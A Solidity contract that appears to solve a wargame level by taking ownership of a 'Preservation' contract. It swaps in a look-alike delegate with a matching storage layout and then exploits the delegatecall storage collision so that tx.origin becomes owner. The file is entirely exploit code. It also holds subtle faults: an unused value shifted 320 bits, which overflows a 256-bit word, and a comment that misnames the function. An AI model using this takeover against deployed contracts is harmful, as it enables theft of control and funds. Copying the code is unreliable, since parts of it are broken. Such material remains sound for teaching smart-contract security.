// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Preservation.sol";

contract Level16 {
    Preservation preservation;
    Level16Delegate level16Delegate;

    constructor(address preservationAddr) public {
        preservation = Preservation(preservationAddr);
        level16Delegate = new Level16Delegate();
    }

    function main() public {
        address timeZone1Library = preservation.timeZone1Library();
        address timeZone2Library = preservation.timeZone2Library();
        address origin = tx.origin;

        uint256 time = (uint256(uint160(timeZone1Library)) << 320) +
            (uint256(uint160(timeZone2Library)) << 160) +
            uint256(uint160(origin));

        // Change the timeZone1Library address to the Level16Delegate
        preservation.setFirstTime(uint256(address(level16Delegate)));
        // Set the owner via the Level16Delegate
        preservation.setFirstTime(uint256(origin));
    }
}

contract Level16Delegate {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // This function actually sets the owner, but we call it
    // `setFirstTime` so the function selector is the same
    // as the time zone library.
    function setTime(uint256 _owner) public {
        owner = address(_owner);
    }
}
